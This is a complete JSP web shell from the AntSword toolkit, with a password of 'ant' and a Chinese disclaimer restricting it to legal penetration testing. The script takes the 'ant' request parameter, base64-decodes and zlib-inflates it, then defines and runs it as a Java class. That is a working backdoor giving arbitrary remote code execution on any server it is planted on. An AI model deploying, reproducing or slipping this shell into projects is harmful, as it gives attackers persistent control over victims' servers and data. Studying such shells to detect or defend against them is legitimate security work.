<%--
             _   ____                       _
  __ _ _ __ | |_/ ___|_      _____  _ __ __| |
 / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
| (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
 \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
———————————————————————————————————————————————
    AntSword JSP Defineclass Zlib deflated Script
    警告：
        此脚本仅供合法的渗透测试以及爱好者参考学习
         请勿用于非法用途，否则将追究其相关责任！
———————————————————————————————————————————————
pass: ant
encoder: https://github.com/AntSwordProject/AwesomeEncoder/blob/master/jsp/encoder/zlib_deflated_class.js
--%>
<%@page import="java.util.*,java.io.*,java.util.zip.*"%>
<%!
  class U extends ClassLoader {
    U(ClassLoader c) {
      super(c);
    }
    public Class g(byte[] b) {
      return super.defineClass(b, 0, b.length);
    }
  }
  public byte[] decompress(byte[] data) {
    byte[] output = new byte[0];
    Inflater dc = new Inflater();
    dc.reset();
    dc.setInput(data);
    ByteArrayOutputStream o = new ByteArrayOutputStream(data.length);
    try {
      byte[] buf = new byte[1024];
      while (!dc.finished()) {
        int i = dc.inflate(buf);
        o.write(buf, 0, i);
      }
      output = o.toByteArray();
    } catch (Exception e) {
        output = data;
        e.printStackTrace();
    } finally {
      try {
          o.close();
      } catch (IOException e) {
          e.printStackTrace();
      }
    }
    dc.end();
    return output;
  }
  public byte[] base64Decode(String str) throws Exception {
    try {
      Class clazz = Class.forName("sun.misc.BASE64Decoder");
      return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
    } catch (Exception e) {
      Class clazz = Class.forName("java.util.Base64");
      Object decoder = clazz.getMethod("getDecoder").invoke(null);
      return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
    }
  }
%>
<%
  String cls = request.getParameter("ant");
  if (cls != null) {
    new U(this.getClass().getClassLoader()).g(decompress(base64Decode(cls))).newInstance().equals(pageContext);
  }
%>